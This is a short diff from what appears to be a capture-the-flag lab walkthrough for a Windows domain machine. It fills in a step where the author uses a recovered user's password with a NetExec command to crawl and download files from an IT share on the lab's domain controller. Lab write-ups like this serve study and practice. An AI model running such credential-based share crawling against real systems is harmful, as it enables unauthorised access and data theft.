@@ -114,7 +114,7 @@
 
 18. And we got jeremy.combs' password! Use jeremy's credentials to download files from IT share once again
 
-``
+`nxc smb dc.voleur.htb -k -u jeremy.combs -p '[PASSWORD]' -d voleur.htb -M spider_plus -o DOWNLOAD_FLAG=True`
 
 <img width="847" height="687" alt="image" src="https://github.com/user-attachments/assets/95d24049-da38-4b47-b978-e730f3744b24" />
 
